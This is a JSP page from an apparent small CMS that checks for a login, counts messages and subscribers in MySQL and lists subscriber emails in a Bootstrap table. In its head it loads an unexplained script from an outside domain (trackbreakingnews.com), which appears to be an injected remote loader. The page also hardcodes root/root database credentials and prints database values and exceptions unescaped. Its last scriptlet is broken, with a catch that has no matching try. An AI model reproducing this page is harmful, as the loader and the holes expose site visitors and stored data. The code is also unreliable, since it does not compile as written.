<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
 <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Profile</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">
    
    <link href="CSS/Style.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <style>
  
  .FF{
  position: relative;
  top:700px;
  
  }
  
  </style>
  
  </head>
  
    <body><%
  		String user=(String) session.getAttribute("xmail");
  	  		if(user==null){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>
    
 				<div class="navbar navbar-inverse navbar-fixed-top">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					
					
						<li> <a href="Home2.jsp">Home</a></li>
					<li > <a href="Course.jsp">Course</a></li>
				
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li><a href="Msg3.jsp">Message <span class="badge"> <%=count %> </span></a></li>
					
					
						<%
						int count1=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from sub";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count1++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li  class="active"> <a href="Sub2.jsp">Subscribers<span class="badge"> <%=count1 %> </span></a></li>
                
					
					</ul>
	          </div> 
	      </div>
	  </div>

  		<div class="row"> 
  			<div class="col-lg-12">
  				<div id="MmyCarousel" class="carousel slide" data-ride="carousel">
  <!-- Indicators -->
  

  <!-- Wrapper for slides -->
  <div class="carousel-inner">
    <div class="item active">
      <img src="iWall/xx1.jpg" alt="xx1" class="img-responsive">
      <div class="carousel-caption">
       
      </div>
    </div>
      
</div>

</div>

</div>
					

<%
Class.forName("com.mysql.jdbc.Driver");
Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
String str="select * from sub";
PreparedStatement ps=con.prepareStatement(str);
ResultSet rs=ps.executeQuery();
%>
<div class="container">
<div class="row">
<div class="row jumbotron">
<div class="col-lg-12">
<div class="table-responsive"><br/><br/><br/>
<div class="alert alert-info" role="alert">Subscriber! </div>

<table class="table">
<tr> 
	 <td class="info"> <h4> User Email</h4> </td>
	       
			<%
			while(rs.next()) {
			%>
		</tr>
			<td class="warning">  <%=rs.getString("mail") %> </td>
			
			</tr>
			<%
	}
	rs.close();
}catch(Exception e) { out.println(e);
%>
</table>
</div>
</div>
</div>
</div>
</div>
						

  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
